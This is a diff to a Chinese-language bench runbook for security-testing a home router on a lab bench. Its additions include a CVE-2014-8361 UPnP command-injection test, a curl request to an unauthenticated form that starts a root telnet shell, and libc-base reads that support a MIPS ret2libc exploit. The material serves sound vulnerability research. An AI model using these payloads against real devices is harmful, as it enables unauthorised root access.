@@ -70,7 +70,7 @@
 | `A3.20` | 借合法功能做偵察，以及一個便宜的可用性測試 | `P8-14` `P8-16` |
 | `A3.21` | 線上的明文憑證，與驅動的私有 ioctl | `P8-17` `P8-20` |
 | `A3.22` | 無線指紋與登入計時 | `P1-11` `P2-10` |
-| `A3.23` | 把桌面算出來的兩份清單拿到矽上 | `P5-6` `P1-7` |
+| `A3.23` | 把桌面算出來的兩份清單拿到矽上 | `P5-6` `P1-7` `P5-2` |
 | `A3.24` | **Reset 按鈕：全場最後一發** | `P9-9` |
 | **第 4 站** | **收工 —— 不碰裝置** | |
 | `A4.1` | 把結果登記進去，重生成登記簿 | — |
@@ -3615,18 +3615,99 @@ sudo nmap -sT -p 5555,7547 10.1.1.1
 
 | 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
 |---|---|---|---|
-| T3 | **會建立一個埠映射，而這一節負責把它刪掉** | [`RUNBOOK` §8.12.29](RUNBOOK.md) | **尚未執行**（2026-08-18 寫） |
+| T3 | **每一發不合它意的請求都會終止 `miniigd`，而那要斷電才回得來** | [`RUNBOOK` §8.12.29](RUNBOOK.md) | 2026-08-19（三發，燒掉三次斷電） |
 
 ```bash
 python3 tools/bench-probe.py ssdp --host 10.1.1.1 -o dumps/w07-ssdp.json
+python3 tools/upnp-soap.py --host 10.1.1.1 --describe
 ```
 
-> 🔴 **SOAP 的路徑是 `/upnp/control/WANIPConnection`，不是手冊寫的 `WANIPConn1`。**
-> 錯的路徑會讓一整輪回 404，看起來像「這台沒有 UPnP」——而 `P1-10` 已經量到 52869 是開的。
-> **一個錯的路徑產生的是一個假的否定。**
+> 🔴 **控制路徑不要用打的。** `/upnp/control/WANIPConn1` 是 `miniupnpd` 的；
+> 這顆 binary 答的是 `/upnp/control/WANIPConnection`。錯的路徑回一個乾淨的 404，
+> 看起來像「這台沒有 UPnP 控制面」——**而埠從頭到尾都是開的**。
+> `upnp-soap.py` 從裝置自己的描述文件讀它，讀不到就拒絕，不猜。
 
-`AddPortMapping` 的四個欄位帶 shell 字元（`P6-1`，CVE-2014-8361），
-`NewInternalClient` 填 `10.1.1.1`（`P8-7`）。**做完必須把映射刪掉，而且在同一節裡完成。**
+**正對照先跑，因為後面每一發都可能是最後一發：**
+
+```bash
+python3 tools/upnp-soap.py --host 10.1.1.1 --action GetExternalIPAddress
+```
+
+```text
+  -> HTTP 200
+  <- NewExternalIPAddress = 127.0.0.1
+```
+
+**`P8-7`——`NewInternalClient` 會不會被驗證等於請求來源：**
+
+```bash
+python3 tools/upnp-soap.py --host 10.1.1.1 --action AddPortMapping \
+  --arg NewRemoteHost= --arg NewExternalPort=8080 --arg NewProtocol=TCP \
+  --arg NewInternalPort=80 --arg NewInternalClient=10.1.1.1 \
+  --arg NewEnabled=1 --arg NewPortMappingDescription=w07 --arg NewLeaseDuration=0
+python3 tools/upnp-soap.py --host 10.1.1.1 \
+  --action GetGenericPortMappingEntry --arg NewPortMappingIndex=0
+```
+
+```text
+  -> HTTP 200
+  <- NewInternalClient = 10.1.1.1        ← 原樣，沒有被改寫成 10.1.1.100
+  <- NewPortMappingDescription = miniupnpd   ← 送出去的值沒有被存
+```
+
+**`P6-1`——CVE-2014-8361。payload 從檔案讀，指令列上不准出現反引號：**
+
+```bash
+printf '%s\n' '`ping -c 4 10.1.1.100`' > /tmp/p61.txt
+python3 tools/upnp-soap.py --host 10.1.1.1 --action AddPortMapping \
+  --arg NewRemoteHost= --arg NewExternalPort=8082 --arg NewProtocol=TCP \
+  --arg NewInternalPort=82 --arg NewInternalClient=PLACEHOLDER \
+  --arg NewEnabled=1 --arg NewPortMappingDescription=w07c --arg NewLeaseDuration=0 \
+  --arg-file NewInternalClient=/tmp/p61.txt --inject
+```
+
+> 🔴 **把 payload 打在指令列上會被你自己的 shell 吃掉，而且是靜默的。**
+> 2026-08-19 第一發就是這樣沒的：打算送 25 bytes 的反引號 payload，
+> **本機 shell 先把它展開了**，實際送出去的是本機 `ping` 的 stdout，431 bytes、8 個換行。
+> `miniigd` 當場死掉，那一發什麼都沒測到。`--arg-file` 就是為了這個而存在，
+> 而**不給 `--inject` 它會拒絕**——一次良性基準和一次注入必須是兩條不同的命令。
+
+> 🔴 **開火之前先想好它會不會回不來。** 2026-08-19 量到的是：
+> **任何 `inet_addr()` 不接受的 `NewInternalClient` 都會終止 `miniigd`**，
+> 不是只有帶元字元的。對照組是 22 個 `A`，一個元字元都沒有，殺得一樣快；
+> 而 `NewInternalClient=10.1.1.1` 這一發它活著。**每死一次就是一次斷電重開。**
+
+**判「死掉」還是「還活著但不聽」——這兩個 `connection refused` 長得一模一樣：**
+
+```bash
+curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formSysCmd \
+  --data-urlencode 'sysCmd=telnetd -l /bin/sh &' --data 'submit-url=/syscmd.htm'
+```
+
+進 telnet 之後 `ps | grep -c miniigd`。2026-08-19 得到 `0`——**行程不存在**，
+與 `P6-3` 的 `wscd`（行程還在、只是關掉 listener）是不同的失敗模式。
+⚠️ 那是一個沒有認證的 root shell，收工前必須斷電。
+
+**映射進到哪裡去了，同一個 shell 裡看：**
+
+```bash
+iptables -t nat -L -n
+```
+
+```text
+Chain MINIUPNPD (0 references)
+DNAT  tcp -- 0.0.0.0/0  0.0.0.0/0  tcp dpt:8083 to:255.255.255.255:83
+```
+
+> ⚠️ **`255.255.255.255` 是 `inet_addr()` 失敗回的 `INADDR_NONE`，而程式照用。**
+> 值完全沒有被驗證，一路進到防火牆規則。
+> 而 **`(0 references)` 不能單獨讀成「映射不通」**：那一場 WAN 線沒接、
+> `ip_forward` 是 `0`，所以那與「沒有 WAN 所以不轉送」完全相容。
+> **`P8-7` 的後半要線在 WAN 埠才判得了。**
+
+**做完把映射刪掉，而且在同一節裡完成**（`--action DeletePortMapping`）。
+2026-08-19 沒有做到：daemon 死了就沒有辦法對它送 `DeletePortMapping`，
+兩條映射是**被斷電清掉的**，而那個區別要照實寫進紀錄卡。
 
 ---
 
@@ -3895,7 +3976,7 @@ sudo tcpdump -i eth1 -s0 -w dumps/w07-creds.pcap 'host 10.1.1.1 and tcp port 80'
 
 ---
 
-### A3.23 🔌 把桌面算出來的兩份清單拿到矽上（關 `P5-6` · `P1-7`）
+### A3.23 🔌 把桌面算出來的兩份清單拿到矽上（關 `P5-6` · `P1-7` · `P5-2`）
 
 | 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
 |---|---|---|---|
@@ -3935,6 +4016,46 @@ sudo tcpdump -i eth1 -s0 -w dumps/w07-creds.pcap 'host 10.1.1.1 and tcp port 80'
 > `http://10.1.1.1/x.txt` 取回，會拿到 **204 與 0 bytes** —— 而 204 跟
 > 「命令沒有執行」長得一模一樣。**telnet shell 比 docroot oracle 可靠**，
 > 而 oracle 一次只吃一條命令不吃腳本（`BENCH-LOG.md` `T-55`）。
+
+#### A3.23.0 `P5-2`：在開火之前，先用同一個 shell 讀 libc 的載入基底
+
+**這一格排在兩發之前，而且它不動任何東西。** 第一發是終局的，`boa` 消失之後
+`/proc/<pid>/maps` 就沒有 `<pid>` 可讀了。
+
+```bash
+telnet 10.1.1.1
+```
+
+進去之後（**未認證 root，收工前一定要斷電**）：
+
+```bash
+cat /proc/sys/kernel/randomize_va_space
+ps | grep boa
+cat /proc/291/maps
+```
+
+> ⚠️ **`ps` 印出來的 PID 每次開機都不一樣**，上一場是 291。**不要照抄那個數字**，
+> 用你自己這一次 `ps` 看到的。抄一個不存在的 PID 會拿到
+> `cat: can't open '/proc/291/maps': No such file or directory`，
+> 而那跟「這個核心沒有 maps」長得一模一樣。
+
+預期看到的（`0x2aae3000` 是桌面上算出來的，**這一步是去反駁它**）：
+
+```text
+00400000-004xxxxx r-xp ... /bin/boa
+2aaa8000-2aab?000 r-xp ... /lib/ld-uClibc-0.9.30.3.so
+2aae3000-2ab15000 r-xp ... /lib/libuClibc-0.9.30.3.so
+```
+
+> 🔴 **反證條件在第一行**：`randomize_va_space` 不是 `0`，或 `libuClibc` 的起始
+> 位址不是 `2aae3000` —— 那就是**每次開機會動**，而
+> [`notes/mips-ret2libc.md`](notes/mips-ret2libc.md) 算出來的 `system @ 0x2ab08460`
+> 只對 2026-08-18 那一次開機成立。**這一次是 reset 之後的另一次開機，所以它答得了
+> 登記簿那條字面反證，而 2026-08-18 那兩行 console 答不了。**
+
+> ⚠️ **`maps` 之外還有一件事這個 shell 才做得到，而它比 `maps` 便宜**：
+> `cat /proc/1/maps` 也行 —— 任何一個 process 都可以，只要它連 `libc`。
+> `boa` 只是因為桌面上那個數字是從 `boa` 的崩潰算出來的，才要對 `boa` 量。
 
 1. `formSchedule`，**缺 `webpage`**。預期：web server 消失且不會自己回來。
 2. 另外抽 2–3 個原本在那 39 個裡、現在活著的（`formNtp`、`formDMZ`）。
@@ -4510,3 +4631,39 @@ P2-9 的桌面半邊、P8-1 P8-5 P8-8 P8-10 P8-18 P8-24 P9-13 P10-7 ——
 | `A2.5` / `A2.6`（寫 flash） | 進站前的計畫說那是 `P6-1`/`P8-7`/`P6-5` 的「唯一的路」。**兩件事都不成立**：那三列 2026-08-18 就已經以 `na` 結案，而 reset 把欄位還原了。全 repo 唯一不可逆的一節沒有被打開 |
 | 路由注入的歸因 | 33 / 121 / 249 一起送，為了在唯一拿得到的那份租約上確保送得到 |
 
+
+## B-W07 增補之三（2026-08-19 桌面，**寫在進站之前**）
+
+**這一場之所以存在，是因為 `P9-9` 成立之後有三列從「唯一的路是寫 flash」變成
+「零 flash 寫入」。** 上一場的收尾表已經記下 `A2.5`/`A2.6` 沒有被打開；今晚是去
+收那三列，而不是去補寫。
+
+**一條網線。** 所以 LAN 與 WAN 不能同時在，順序被硬體決定而不是被偏好決定：
+`A3.15` 的 SOAP 全部在 LAN 側，`P6-5` 的向量必須從 WAN 側送，而線一移到 WAN，
+`10.1.1.1` 的管理通道就沒了。**LAN 側的事必須全部做完才准移線。**
+
+| 循環 | 站 | 節 | 為什麼是這個順序 |
+|---|---|---|---|
+| 1 | 第 2 站（CP2102 接上） | `A2.1` → `A2.2` → `A2.3` | 作者選的：**趁基準最乾淨的時候抓**。這一份 dump 同時關掉開放題 76 與 80 |
+| — | — | **斷電，並把 CP2102 從排針上整個拔掉** | 開放題 79。板子帶著轉接板不開機，而它跟磚長得一樣 |
+| 2 | 第 3 站（線在 LAN） | `A3.1`（含 `A3.1.4`） | `make liveness` 現在應該回 `OK`，因為 reset 把 `DHCP_MTU_SIZE` 還原了 |
+| 2 | 第 3 站 | `A3.4`（含 `A3.4.4`） | **52869 是開是關，是今晚第一個真正的問題**，見下 |
+| 2 | 第 3 站 | `A3.15` | `P6-1` 與 `P8-7` 的 (a) 半 —— 兩者都在 LAN 側 |
+| 2 | 第 3 站 | `A3.23.0`（**新增**） | `P5-2`。telnet 進去讀 `maps`，不開火。**排在任何崩潰之前** |
+| 3 | WAN 側（**不斷電，只移線**） | `A3.18.1` → `A3.18.2` → `P6-5` | 埠映射在 iptables 與 RAM 裡，移線不會清掉，所以 `P8-7` 的 (b) 半接得上 |
+| 4 | 收尾 | `A4.1` | 登記、`make ledger`、`make ci` |
+
+**`A3.23` 的兩發（`P5-6` / `P1-7`）今晚不跑。** 它們 2026-08-18 已經跑過而且結案，
+第一發是終局的，而今晚後面還有 WAN 那一段要用 `boa`。**只跑新增的 `A3.23.0`。**
+
+**這一場唯一新增的 Part A 內容是 `A3.23.0`**，理由寫在 `RUNBOOK` §8.12.37 的
+2026-08-19 追加段：`P5-2` 原本每量一次要打掉一次 `boa`，`/proc/<pid>/maps` 讓它
+變成讀兩個檔。
+
+**今晚不做，而且理由不是時間**：
+
+| 不做 | 為什麼 |
+|---|---|
+| `A2.5` / `A2.6`（寫 flash） | 那三列不需要它了。**全 repo 唯一不可逆的一節連續第二場沒有被打開** |
+| `A3.23` 的第一發（`formSchedule`） | 終局的，而 WAN 那一段還要用 `boa`。`P5-6` 已結案 |
+| `A3.24`（reset） | 今晚要量的是 reset **之後**的狀態。再按一次就把它洗掉了 |
